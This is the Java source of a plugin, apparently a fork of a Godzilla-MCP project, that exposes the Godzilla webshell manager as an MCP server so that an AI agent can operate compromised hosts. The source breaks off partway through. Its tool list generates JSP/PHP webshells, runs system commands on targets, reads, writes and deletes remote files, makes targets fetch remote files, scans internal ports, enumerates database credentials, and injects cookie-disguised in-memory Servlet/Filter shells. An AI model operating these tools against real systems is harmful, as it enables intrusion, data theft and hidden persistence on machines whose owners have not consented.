package shells.plugins.online;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import core.Db;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.MainActivity;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.io.ByteArrayOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;
import java.util.Vector;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.Executors;

/**
 * Godzilla-MCP Headless Edition v1.2.0
 * ====================================
 * 基于 hkdonline/Godzilla-MCP（上游改版自 cns1rius/godzilla-mcp）修改，感谢原作者。
 *
 * 本版主要改动：
 *   [新增] 无头启动器 GodzillaMcpHeadlessBootstrap 与 --stdio 传输（无需启动哥斯拉 GUI）
 *   [新增] generate_shell 工具：生成 JSP / PHP 哥斯拉马
 *   [修复] 无头环境缺少 ApplicationContext.init() 导致的 NPE
 *   [修复] util.Log 输出污染 stdio 的 stdout（改为 stderr）
 *   [修复] generate_shell 密钥派生：与 JavaAesBase64/PhpXor.generate 对齐为 md5(secretKey)[0:16]
 *   [修复] read_file 使用 downloadFile 读取文件内容（原为目录枚举接口）
 *   [调整] HTTP 模式监听地址可配置，默认建议 127.0.0.1
 *   [v1.2] 扩展至 40+ 工具：会话直连/断开、文件全家桶（删除/复制/移动/新建/属性）、
 *          大文件分块上传下载、远程下载、端口扫描、内存马注入/列表/卸载（Servlet/Filter）、
 *          流量伪装、Shellcode、ZIP 压缩、数据库枚举、插件库管理（无 GUI 场景）等
 *
 * 仓库: https://github.com/Ch1ngg/Godzilla-MCP-Headless
 */
@PluginAnnotation(payloadName = "GodzillaMcpServerPlugin", Name = "GodzillaMcpServerPlugin", DisplayName = "GodzillaMcpServerPlugin")
public class GodzillaMcpServerPlugin implements Plugin {

    // 核心：无状态载荷连接池，支持 AI 并发控制多台靶机
    private static final ConcurrentHashMap<String, Payload> payloadCache = new ConcurrentHashMap<>();
    // === 全局状态 ===
    private static boolean isServerRunning = false;
    private static HttpServer mcpServer = null;

    private static final String PROTOCOL_VERSION = "2024-11-05";
    private static final String SERVER_NAME = "godzilla-mcp";
    private static final String SERVER_VERSION = "1.2.0";
    private static final SimpleDateFormat LOG_DATE_FMT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    private static PrintWriter logWriter = null;

    private static synchronized void log(String msg) {
        String ts = LOG_DATE_FMT.format(new Date());
        String line = ts + " " + msg;
        System.err.println(line);
        if (logWriter != null) {
            logWriter.println(line);
            logWriter.flush();
        }
    }

    private static synchronized void logNoTs(String msg) {
        System.err.print(msg);
        if (logWriter != null) {
            logWriter.print(msg);
            logWriter.flush();
        }
    }

    // ==========================================
    // 1. 静态代码块：GUI 菜单
    // ==========================================
    static {
        // [headless patch]
        if (!Boolean.getBoolean("godzilla.mcp.headless")) {
        JMenuItem startMenuItem = new JMenuItem("启动 AI Agent 自动化引擎");

        startMenuItem.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (isServerRunning) {
                    JOptionPane.showMessageDialog(MainActivity.getMainActivityFrame(),
                            "Agent 引擎已经在后台运行中！", "提示", JOptionPane.WARNING_MESSAGE);
                    return;
                }

                JPanel inputPanel = new JPanel(new GridLayout(1, 2, 5, 5));
                inputPanel.add(new JLabel("监听端口 (默认 5566):"));
                JTextField portField = new JTextField("5566");
                inputPanel.add(portField);

                int result = JOptionPane.showConfirmDialog(
                        MainActivity.getMainActivityFrame(), inputPanel,
                        "初始化 Godzilla MCP 引擎", JOptionPane.OK_CANCEL_OPTION, JOptionPane.PLAIN_MESSAGE);

                if (result == JOptionPane.OK_OPTION) {
                    try {
                        int port = Integer.parseInt(portField.getText().trim());

                        try {
                core.ApplicationContext.init();
                log("[headless] ApplicationContext 初始化完成");
            } catch (Throwable t) {
                log("[headless] ApplicationContext.init 异常: " + t);
            }
            startServer(port);
                        startMenuItem.setText("AI Agent 引擎 [运行中: " + port + "]");
                        JOptionPane.showMessageDialog(MainActivity.getMainActivityFrame(),
                                "MCP 服务启动成功！v" + SERVER_VERSION + "\n\nClaude Desktop 配置:\n{\"mcpServers\":{\"godzilla\":{\"url\":\"http://127.0.0.1:" + port + "/mcp\"}}}\n\n支持 GET /mcp 建立 SSE 通道\n或 POST 直接 JSON-RPC 调用");
                    } catch (Exception ex) {
                        JOptionPane.showMessageDialog(MainActivity.getMainActivityFrame(),
                                "启动失败: " + ex.getMessage(), "错误", JOptionPane.ERROR_MESSAGE);
                    }
                }
            }
        });

        JMenuItem stopMenuItem = new JMenuItem("停止 AI Agent 自动化引擎");

        stopMenuItem.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                if (!isServerRunning) {
                    JOptionPane.showMessageDialog(MainActivity.getMainActivityFrame(),
                            "Agent 引擎当前未运行。", "提示", JOptionPane.INFORMATION_MESSAGE);
                    return;
                }

                int result = JOptionPane.showConfirmDialog(
                        MainActivity.getMainActivityFrame(),
                        "确定要停止 AI Agent 引擎吗？\n停止后所有 AI 连接将被断开。",
                        "确认停止", JOptionPane.YES_NO_OPTION, JOptionPane.WARNING_MESSAGE);

                if (result == JOptionPane.YES_OPTION) {
                    stopServer();
                    startMenuItem.setText("启动 AI Agent 自动化引擎");
                    JOptionPane.showMessageDialog(MainActivity.getMainActivityFrame(),
                            "AI Agent 引擎已停止。");
                }
            }
        });

        MainActivity.registerPluginJMenuItem(startMenuItem);
        MainActivity.registerPluginJMenuItem(stopMenuItem);
            }
    }

    /* ===== [headless patch] 无头启动入口 ===== */
    static String BIND_HOST = "0.0.0.0";

    public static void main(String[] args) throws Exception {
        if (args.length >= 1 && "--stdio".equals(args[0])) {
            runStdio();
        } else {
            int port = args.length >= 1 ? Integer.parseInt(args[0]) : 5566;
            if (args.length >= 2) {
                BIND_HOST = args[1];
            }
            startServer(port);
            log("[headless] HTTP 模式运行中: http://" + BIND_HOST + ":" + port + "/mcp (Ctrl+C 退出)");
        }
    }

    private static void runStdio() throws Exception {
        logWriter = new PrintWriter(new FileWriter("godzilla-mcp.log", true), true);
        java.io.BufferedReader in = new java.io.BufferedReader(
                new java.io.InputStreamReader(System.in, StandardCharsets.UTF_8));
        java.io.PrintStream out = new java.io.PrintStream(
                new java.io.FileOutputStream(java.io.FileDescriptor.out), true, "UTF-8");
        System.setOut(System.err); // [headless patch] Godzilla util.Log 走 stderr，保持 stdout 纯净
        try {
            core.ApplicationContext.init();
            log("[stdio] ApplicationContext 初始化完成");
        } catch (Throwable t) {
            log("[stdio] ApplicationContext.init 异常: " + t);
        }
        McpHandler handler = new McpHandler();
        log("[stdio] Godzilla MCP stdio 模式启动");
        String line;
        while ((line = in.readLine()) != null) {
            line = line.trim();
            if (line.isEmpty()) {
                continue;
            }
            JsonObject req;
            try {
                req = JsonParser.parseString(line).getAsJsonObject();
            } catch (Exception e) {
                writeStdioError(out, null, -32700, "Parse error: " + McpHandler.stringifyError(e));
                continue;
            }
            String method = req.has("method") ? req.get("method").getAsString() : "";
            JsonElement id = req.has("id") ? req.get("id") : null;
            JsonObject params = (req.has("params") && req.get("params").isJsonObject())
                    ? req.getAsJsonObject("params") : new JsonObject();
            if (id == null) {
                continue;
            }
            try {
                JsonElement result;
                switch (method) {
                    case "initialize":
                        result = handler.handleInitialize(params);
                        break;
                    case "tools/list":
                        result = handler.handleToolsList();
                        break;
                    case "tools/call":
                        result = handler.handleToolsCall(params);
                        break;
                    case "resources/list":
                        result = handler.handleResourcesList();
                        break;
                    case "ping": {
                        JsonObject pong = new JsonObject();
                        pong.addProperty("pong", true);
                        result = pong;
                        break;
                    }
                    default:
                        writeStdioError(out, id, -32601, "Method not found: " + method);
                        continue;
                }
                JsonObject resp = new JsonObject();
                resp.addProperty("jsonrpc", "2.0");
                resp.add("id", id);
                resp.add("result", result);
                out.println(resp.toString());
            } catch (Throwable e) {
                McpHandler.logStackTrace(e);
                writeStdioError(out, id, -32603, McpHandler.stringifyError(e));
            }
        }
        System.exit(0);
    }

    private static void writeStdioError(java.io.PrintStream out, JsonElement id, int code, String message) {
        JsonObject resp = new JsonObject();
        resp.addProperty("jsonrpc", "2.0");
        if (id != null) {
            resp.add("id", id);
        }
        JsonObject err = new JsonObject();
        err.addProperty("code", code);
        err.addProperty("message", message);
        resp.add("error", err);
        out.println(resp.toString());
    }

    private static void startServer(int port) throws IOException {
        logWriter = new PrintWriter(new FileWriter("godzilla-mcp.log", true), true);
        log("========================================");
        log("Godzilla MCP 服务启动 v" + SERVER_VERSION);
        log("========================================");

        mcpServer = HttpServer.create(new InetSocketAddress(BIND_HOST, port), 0);
        McpHandler handler = new McpHandler();
        // 同时注册 /mcp (标准 MCP 路径) 和 /api/agent_router (兼容旧版)
        mcpServer.createContext("/mcp", handler);
        mcpServer.createContext("/sse", handler);
        mcpServer.createContext("/api/agent_router", handler);
        mcpServer.setExecutor(Executors.newFixedThreadPool(10));
        mcpServer.start();
        isServerRunning = true;
        log("[Godzilla MCP] MCP 服务启动，绑定 0.0.0.0:" + port);
    }

    private static void stopServer() {
        log("MCP 服务正在关闭...");
        if (mcpServer != null) {
            mcpServer.stop(0);
            mcpServer = null;
        }
        isServerRunning = false;
        payloadCache.clear();
        if (logWriter != null) {
            logWriter.close();
            logWriter = null;
        }
    }

    // ==========================================
    // 2. 插件实例视图
    // ==========================================
    @Override
    public void init(ShellEntity shellEntity) {
    }

    @Override
    public JPanel getView() {
        JPanel panel = new JPanel(new BorderLayout());
        JLabel label = new JLabel("<html><center><h2>Godzilla MCP 服务插件</h2>" +
                "<p>标准 MCP (Model Context Protocol) JSON-RPC 2.0 协议</p>" +
                "<p>端点: /mcp | 兼容旧版: /api/agent_router</p>" +
                "<p>请通过哥斯拉顶部菜单栏启动服务。</p></center></html>");
        panel.add(label, BorderLayout.CENTER);
        return panel;
    }

    // ==========================================
    // 3. MCP JSON-RPC 2.0 协议处理器（支持 SSE 传输）
    // ==========================================
    static class McpHandler implements HttpHandler {
        // SSE 会话：sessionId → HttpExchange（用于推送响应）
        private static final ConcurrentHashMap<String, HttpExchange> sseSessions = new ConcurrentHashMap<>();

        @Override
        public void handle(HttpExchange exchange) throws IOException {
            // CORS 头
            exchange.getResponseHeaders().add("Access-Control-Allow-Origin", "*");
            exchange.getResponseHeaders().add("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
            exchange.getResponseHeaders().add("Access-Control-Allow-Headers", "Content-Type, Authorization");

            if ("OPTIONS".equals(exchange.getRequestMethod())) {
                exchange.sendResponseHeaders(204, -1);
                return;
            }

            // ========== GET：建立 SSE 连接 ==========
            if ("GET".equals(exchange.getRequestMethod())) {
                handleSseConnect(exchange);
                return;
            }

            // ========== POST：JSON-RPC 请求 ==========
            if (!"POST".equals(exchange.getRequestMethod())) {
                sendJsonRpcError(exchange, null, -32600, "Method Not Allowed. Use GET (SSE) or POST.");
                return;
            }

            try {
                InputStream is = exchange.getRequestBody();
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                byte[] buffer = new byte[1024];
                int len;
                while ((len = is.read(buffer)) != -1) baos.write(buffer, 0, len);
                String requestBody = new String(baos.toByteArray(), StandardCharsets.UTF_8);

                JsonObject jsonReq = JsonParser.parseString(requestBody).getAsJsonObject();

                // 获取 sessionId（如果有）
                String sessionId = getQueryParam(exchange, "sessionId");

                // 如果带 sessionId，使用 SSE 通道响应
                if (sessionId != null && !sessionId.isEmpty()) {
                    handleMcpViaSse(exchange, jsonReq, sessionId);
                }
                // 否则：直接 HTTP 响应（兼容模式）
                else if (jsonReq.has("jsonrpc") && jsonReq.has("method")) {
                    handleMcpRequest(exchange, jsonReq);
                } else if (jsonReq.has("action")) {
                    handleLegacyRequest(exchange, jsonReq);
                } else {
                    sendJsonRpcError(exchange, null, -32600, "Invalid Request");
                }
            } catch (Exception e) {
                sendJsonRpcError(exchange, null, -32700, "Parse error: " + stringifyError(e));
            }
        }

        // ---- SSE 连接建立 ----
        private void handleSseConnect(HttpExchange exchange) throws IOException {
            String sessionId = java.util.UUID.randomUUID().toString();
            sseSessions.put(sessionId, exchange);

            exchange.getResponseHeaders().set("Content-Type", "text/event-stream");
            exchange.getResponseHeaders().set("Cache-Control", "no-cache");
            exchange.getResponseHeaders().set("Connection", "keep-alive");
            exchange.sendResponseHeaders(200, 0); // 0 = chunked

            OutputStream os = exchange.getResponseBody();

            // 发送 endpoint 事件，告知客户端 POST 消息的目标 URL
            String endpointEvent = "event: endpoint\ndata: /mcp?sessionId=" + sessionId + "\n\n";
            os.write(endpointEvent.getBytes(StandardCharsets.UTF_8));
            os.flush();

            log("[MCP SSE] 会话建立: " + sessionId);

            // 保持连接打开，由其他线程通过 SSE 推送响应
            // 连接在客户端断开或超时时由 HTTP Server 自动关闭
        }

        // ---- 通过 SSE 通道处理 MCP 请求 ----
        private void handleMcpViaSse(HttpExchange exchange, JsonObject req, String sessionId) {
            HttpExchange sseExchange = sseSessions.get(sessionId);
            if (sseExchange == null) {
                log("[MCP SSE] ERROR: session not found: " + sessionId);
                try {
                    sendJsonRpcError(exchange, null, -32000, "SSE session not found: " + sessionId);
                } catch (IOException e) {
                    log("[MCP SSE] 发送 SSE-session-not-found 错误失败: " + stringifyError(e));
                }
                return;
            }

            String method = req.get("method").getAsString();
            JsonElement idElem = req.has("id") ? req.get("id") : null;
            JsonObject params = req.has("params") && req.get("params").isJsonObject()
                    ? req.getAsJsonObject("params") : new JsonObject();

            try {
                JsonElement result;
                switch (method) {
                    case "initialize":
                        result = handleInitialize(params);
                        break;
                    case "tools/list":
                        result = handleToolsList();
                        break;
                    case "tools/call":
                        result = handleToolsCall(params);
                        break;
                    case "resources/list":
                        result = handleResourcesList();
                        break;
                    case "notifications/initialized":
                        sendHttpJsonResponse(exchange, 202, "{}");
                        return;
                    default:
                        sendSseError(sseExchange, idElem, -32601, "Method not found: " + method);
                        sendHttpJsonResponse(exchange, 202, "{}");
                        return;
                }
                sendSseSuccess(sseExchange, idElem, result);
                // 对 POST 请求自身也回复 202
                sendHttpJsonResponse(exchange, 202, "{}");
            } catch (Exception e) {
                log("[MCP SSE] tools/call 异常: " + stringifyError(e));
                logStackTrace(e);
                try {
                    sendSseError(sseExchange, idElem, -32603, stringifyError(e));
                    sendHttpJsonResponse(exchange, 202, "{}");
                } catch (IOException ex) {
                    log("[MCP SSE] 发送 SSE error 失败: " + ex.getMessage());
                }
            }
        }

        // ---- SSE 推送辅助 ----
        private void sendSseSuccess(HttpExchange sseExchange, JsonElement id, JsonElement result) throws IOException {
            JsonObject response = buildJsonRpcResponse(id, result);
            sendSseEvent(sseExchange, "message", response.toString());
        }

        private void sendSseError(HttpExchange sseExchange, JsonElement id, int code, String message) throws IOException {
            JsonObject err = buildJsonRpcError(id, code, message);
            sendSseEvent(sseExchange, "message", err.toString());
        }

        private void sendSseEvent(HttpExchange sseExchange, String eventType, String data) throws IOException {
            OutputStream os = sseExchange.getResponseBody();
            String event = "event: " + eventType + "\ndata: " + data + "\n\n";
            os.write(event.getBytes(StandardCharsets.UTF_8));
            os.flush();
        }

        // ---- 查询参数解析 ----
        private String getQueryParam(HttpExchange exchange, String key) {
            String query = exchange.getRequestURI().getQuery();
            if (query == null) return null;
            for (String param : query.split("&")) {
                String[] pair = param.split("=", 2);
                if (pair.length == 2 && pair[0].equals(key)) {
                    return pair[1];
                }
            }
            return null;
        }

        // ---- 工具方法：构建 JSON-RPC 响应 ----
        private JsonObject buildJsonRpcResponse(JsonElement id, JsonElement result) {
            JsonObject resp = new JsonObject();
            resp.addProperty("jsonrpc", "2.0");
            if (id != null) resp.add("id", id);
            resp.add("result", result);
            return resp;
        }

        private JsonObject buildJsonRpcError(JsonElement id, int code, String message) {
            JsonObject resp = new JsonObject();
            resp.addProperty("jsonrpc", "2.0");
            if (id != null) resp.add("id", id);
            JsonObject err = new JsonObject();
            err.addProperty("code", code);
            err.addProperty("message", message);
            resp.add("error", err);
            return resp;
        }

        // ========== MCP JSON-RPC 协议处理（直接 HTTP 兼容模式）==========

        private void handleMcpRequest(HttpExchange exchange, JsonObject req) throws IOException {
            String method = req.get("method").getAsString();
            JsonElement idElem = req.has("id") ? req.get("id") : null;
            JsonObject params = req.has("params") && req.get("params").isJsonObject()
                    ? req.getAsJsonObject("params") : new JsonObject();

            try {
                JsonElement result;
                switch (method) {
                    case "initialize":
                        result = handleInitialize(params);
                        break;
                    case "tools/list":
                        result = handleToolsList();
                        break;
                    case "tools/call":
                        result = handleToolsCall(params);
                        break;
                    case "resources/list":
                        result = handleResourcesList();
                        break;
                    case "notifications/initialized":
                        exchange.sendResponseHeaders(202, -1);
                        return;
                    default:
                        sendJsonRpcError(exchange, idElem, -32601, "Method not found: " + method);
                        return;
                }
                sendJsonRpcSuccess(exchange, idElem, result);
            } catch (Exception e) {
                log("[MCP] handleMcpRequest 异常 (" + method + "): " + stringifyError(e));
                logStackTrace(e);
                sendJsonRpcError(exchange, idElem, -32603, stringifyError(e));
            }
        }

        // --- initialize ---
        private JsonObject handleInitialize(JsonObject params) {
            JsonObject result = new JsonObject();
            result.addProperty("protocolVersion", PROTOCOL_VERSION);

            JsonObject capabilities = new JsonObject();
            JsonObject toolsCap = new JsonObject();
            capabilities.add("tools", toolsCap);
            result.add("capabilities", capabilities);

            JsonObject serverInfo = new JsonObject();
            serverInfo.addProperty("name", SERVER_NAME);
            serverInfo.addProperty("version", SERVER_VERSION);
            result.add("serverInfo", serverInfo);

            return result;
        }

        // --- tools/list ---
        private JsonObject handleToolsList() {
            JsonObject result = new JsonObject();
            JsonArray tools = new JsonArray();

            // ===== 资产管理类工具（无需 targetUrl）=====
            tools.add(buildToolDef("list_shells",
                    "列出哥斯拉中所有已保存的 Webshell 连接",
                    buildSchema()));

            tools.add(buildToolDef("add_shell",
                    "向哥斯拉数据库添加一个新的 Webshell 连接",
                    buildSchema(
                            strProp("url", "Webshell 的完整 URL 地址"),
                            strProp("password", "连接密码"),
                            strProp("secretKey", "加密密钥"),
                            strProp("payload", "Payload 类型，如 JavaDynamicPayload、PhpDynamicPayload"),
                            strProp("cryption", "加密方式，如 JAVA_AES_BASE64、PHP_XOR_BASE64")
                    )));

            tools.add(buildToolDef("get_env_config",
                    "获取当前支持的 Payload 和加密方式列表",
                    buildSchema()));

            tools.add(buildToolDef("generate_shell",
                    "生成哥斯拉 Webshell 文件（JSP/PHP）。cryption 支持 JAVA_AES_BASE64 / JAVA_AES_RAW / PHP_XOR_BASE64 / PHP_XOR_RAW",
                    buildSchema(
                            strProp("cryption", "加密方式: JAVA_AES_BASE64 | JAVA_AES_RAW | PHP_XOR_BASE64 | PHP_XOR_RAW"),
                            strProp("password", "连接密码"),
                            strProp("secretKey", "加密密钥"),
                            strProp("outputPath", "本地输出文件路径，例如 /tmp/shell.jsp")
                    )));

            // ===== 靶机操作类工具（需要 targetUrl）=====
            tools.add(buildToolDef("get_basics_info",
                    "获取目标靶机的基本系统信息（OS、主机名、用户、IP、环境变量等）",
                    buildSchema(
                            strProp("targetUrl", "目标 Webshell 的 URL，必须已保存在数据库中")
                    )));

            tools.add(buildToolDef("exec_command",
                    "在目标靶机上执行系统命令（Windows CMD / Linux Bash）",
                    buildSchema(
                            strProp("targetUrl", "目标 Webshell 的 URL"),
                            strProp("command", "要执行的系统命令")
                    )));

            tools.add(buildToolDef("list_files",
                    "列出目标靶机指定目录下的文件和子目录",
                    buildSchema(
                            strProp("targetUrl", "目标 Webshell 的 URL"),
                            strProp("dirPath", "要列出的目录路径，如 / 或 C:\\")
                    )));

            tools.add(buildToolDef("read_file",
                    "读取目标靶机上的文件内容（返回 Base64 编码，二进制文件也适用）",
                    buildSchema(
                            strProp("targetUrl", "目标 Webshell 的 URL"),
                            strProp("filePath", "要读取的文件完整路径")
                    )));

            tools.add(buildToolDef("upload_file",
                    "向目标靶机上传文件（内容需 Base64 编码）",
                    buildSchema(
                            strProp("targetUrl", "目标 Webshell 的 URL"),
                            strProp("filePath", "目标文件路径"),
                            strProp("base64Data", "文件内容的 Base64 编码")
                    )));

            tools.add(buildToolDef("exec_sql",
                    "通过靶机隧道连接内网数据库并执行 SQL 查询",
                    buildSchema(
                            strProp("targetUrl", "目标 Webshell 的 URL"),
                            strProp("dbType", "数据库类型：mysql、mssql、oracle、postgresql、sqlite"),
                            strProp("dbHost", "数据库主机地址"),
                            numProp("dbPort", "数据库端口"),
                            strProp("dbUser", "数据库用户名"),
                            strProp("dbPass", "数据库密码"),
                            strProp("dbName", "数据库名称"),
                            strProp("execSql", "要执行的 SQL 语句")
                    )));

            tools.add(buildToolDef("connect_shell", "直接连接一个 Webshell（无需预先保存，可选 save=true 写入哥斯拉库）", buildSchemaEx(new String[][]{
                    strProp("url", "Webshell URL"), strProp("password", "连接密码"), strProp("secretKey", "加密密钥")
            }, new String[][]{
                    strProp("payload", "Payload 类型，默认 JavaDynamicPayload"), strProp("cryption", "加密方式，默认 JAVA_AES_BASE64"),
                    boolProp("save", "是否写入哥斯拉库（默认 false）")
            })));
            tools.add(buildToolDef("disconnect_shell", "断开（移除）已连接会话；不传 targetUrl 则断开全部", buildSchemaEx(new String[][]{},
                    new String[][]{ strProp("targetUrl", "目标 URL（可选）") })));
            tools.add(buildToolDef("list_sessions", "列出当前已缓存的连接会话", buildSchemaEx(new String[][]{}, null)));
            tools.add(buildToolDef("test_connection", "测试目标连接是否存活并返回用户信息", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL")
            }, null)));
            tools.add(buildToolDef("remove_shell", "从哥斯拉库中删除一条保存的 Webshell 记录", buildSchemaEx(new String[][]{
                    strProp("selector", "URL、ID 或列表序号")
            }, null)));

            tools.add(buildToolDef("plugin_list", "列出哥斯拉库中已注册的插件 JAR 路径", buildSchemaEx(new String[][]{}, null)));
            tools.add(buildToolDef("plugin_add", "注册一个插件 JAR 到哥斯拉库（无 GUI 环境同样可用，重启哥斯拉生效）", buildSchemaEx(new String[][]{
                    strProp("path", "插件 JAR 的本地绝对路径")
            }, null)));
            tools.add(buildToolDef("plugin_remove", "从哥斯拉库中移除一个插件 JAR 记录", buildSchemaEx(new String[][]{
                    strProp("path", "插件 JAR 的本地绝对路径")
            }, null)));

            tools.add(buildToolDef("current_user", "获取目标当前用户与工作目录", buildSchemaEx(new String[][]{ strProp("targetUrl", "目标 Webshell 的 URL") }, null)));
            tools.add(buildToolDef("process_list", "列出目标系统进程（Linux: ps / Windows: tasklist）", buildSchemaEx(new String[][]{ strProp("targetUrl", "目标 Webshell 的 URL") }, null)));
            tools.add(buildToolDef("network_info", "获取目标网络信息（IP、监听端口、连接等）", buildSchemaEx(new String[][]{ strProp("targetUrl", "目标 Webshell 的 URL") }, null)));
            tools.add(buildToolDef("screenshot", "对目标桌面截图（Java 载荷；无显示环境会返回错误）", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL")
            }, new String[][]{ strProp("savePath", "本地保存路径（可选，不填则返回 base64）") })));

            tools.add(buildToolDef("exec_code", "在目标执行 PHP 代码（仅 PhpDynamicPayload；要求目标 output_buffering>0，发行版 PHP 默认满足）", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("code", "PHP 代码（不含 <?php）")
            }, null)));

            tools.add(buildToolDef("write_file", "写入（覆盖）目标文件内容", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("path", "目标文件路径"), strProp("content", "文件内容（文本）")
            }, null)));
            tools.add(buildToolDef("download_file", "从目标下载文件到本地（自动分块，支持大文件）", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("remotePath", "目标文件路径"), strProp("localPath", "本地保存路径")
            }, null)));
            tools.add(buildToolDef("delete_file", "删除目标文件/目录", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("path", "目标路径")
            }, null)));
            tools.add(buildToolDef("copy_file", "在目标上复制文件/目录", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("src", "源路径"), strProp("dest", "目标路径")
            }, null)));
            tools.add(buildToolDef("move_file", "在目标上移动/重命名文件", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("src", "源路径"), strProp("dest", "目标路径")
            }, null)));
            tools.add(buildToolDef("new_file", "在目标上创建空文件", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("path", "文件路径")
            }, null)));
            tools.add(buildToolDef("new_dir", "在目标上创建目录", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("path", "目录路径")
            }, null)));
            tools.add(buildToolDef("list_root", "列出目标根目录/盘符", buildSchemaEx(new String[][]{ strProp("targetUrl", "目标 Webshell 的 URL") }, null)));
            tools.add(buildToolDef("file_size", "获取目标文件大小（字节）", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("path", "目标文件路径")
            }, null)));
            tools.add(buildToolDef("file_remote_down", "让目标从指定 URL 下载文件（目标直连下载，不占本地带宽）", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("url", "下载地址"), strProp("savePath", "目标保存路径")
            }, null)));
            tools.add(buildToolDef("big_file_upload", "从本地上传大文件到目标（分块传输）", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("localPath", "本地文件路径"), strProp("remotePath", "目标保存路径")
            }, null)));

            tools.add(buildToolDef("list_databases", "通过 Webshell 隧道列出内网数据库名单", buildSchemaEx(new String[][]{
                    strProp("host", "数据库主机")
            }, new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("dbType", "数据库类型: mysql/mssql/oracle/postgresql（默认 mysql）"),
                    numProp("port", "端口（默认 3306）"), strProp("username", "用户名（默认 root）"), strProp("password", "密码")
            })));
            tools.add(buildToolDef("enum_database_conn", "枚举目标应用配置中的数据库连接信息（等效哥斯拉 ShellDriver 插件）", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL")
            }, null)));

            tools.add(buildToolDef("port_scan", "通过 Webshell 隧道扫描目标内网端口", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("target", "目标 IP/网段"), strProp("ports", "端口列表，如 22,80,8000-8100")
            }, null)));
            tools.add(buildToolDef("memory_shell_inject", "向目标 Java Web 应用注入内存马（Servlet/Listener 型）", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("urlPattern", "内存马访问路径，如 /favicon.ico"),
                    strProp("password", "内存马密码"), strProp("secretKey", "内存马密钥")
            }, new String[][]{
                    strProp("shellType", "类型: AES_BASE64/AES_RAW/Behinder/Cknife/ReGeorg（默认 AES_BASE64）")
            })));
            tools.add(buildToolDef("memory_shell_list", "列出目标应用中的 Servlet 内存马", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL")
            }, null)));
            tools.add(buildToolDef("memory_shell_unload", "卸载目标应用中的内存马（按 wrapperName/urlPattern）", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("wrapperName", "wrapper 名称")
            }, new String[][]{ strProp("urlPattern", "URL 路径（可选，默认同 wrapperName）") })));
            tools.add(buildToolDef("filter_shell_add", "注入 Filter 型内存马（带 Cookie 伪装）", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("password", "密码"), strProp("secretKey", "密钥")
            }, new String[][]{
                    strProp("cookie", "Cookie 名（可选，默认随机）"), strProp("shellType", "类型: AES_BASE64/AES_RAW（默认 AES_BASE64）")
            })));
            tools.add(buildToolDef("filter_shell_list", "列出目标应用中的 Filter 内存马", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL")
            }, null)));
            tools.add(buildToolDef("filter_shell_remove", "移除目标应用中的 Filter 内存马", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("filterName", "filter 名称")
            }, null)));
            tools.add(buildToolDef("zip", "在目标上压缩/解压 ZIP", buildSchemaEx(new String[][]{
                    strProp("targetUrl", "目标 Webshell 的 URL"), strProp("action", "zip=压缩 / unzip=解压"),
                    strProp("src", "源路径（压缩=目录，解压=zip文件）"), strProp("dest", "目标路径（压缩=zip路径，解压=目录）")
            }, null)));
            result.add("tools", tools);
            return result;
        }

        // 属性描述符：name, type("string"/"number"), description
        private static String[] strProp(String name, String desc) {
            return new String[]{name, "string", desc};
        }

        private static String[] numProp(String name, String desc) {
            return new String[]{name, "number", desc};
        }

        private String[] boolProp(String name, String desc) {
            return new String[]{name, "boolean", desc};
        }

        private JsonObject buildSchemaEx(String[][] req, String[][] opt) {
            JsonObject schema = new JsonObject();
            schema.addProperty("type", "object");
            JsonObject props = new JsonObject();
            JsonArray required = new JsonArray();
            addProps(props, required, req, true);
            addProps(props, required, opt, false);
            schema.add("properties", props);
            schema.add("required", required);
            return schema;
        }

        private void addProps(JsonObject props, JsonArray required, String[][] defs, boolean isRequired) {
            if (defs == null) return;
            for (String[] def : defs) {
                JsonObject prop = new JsonObject();
                prop.addProperty("type", def[1]);
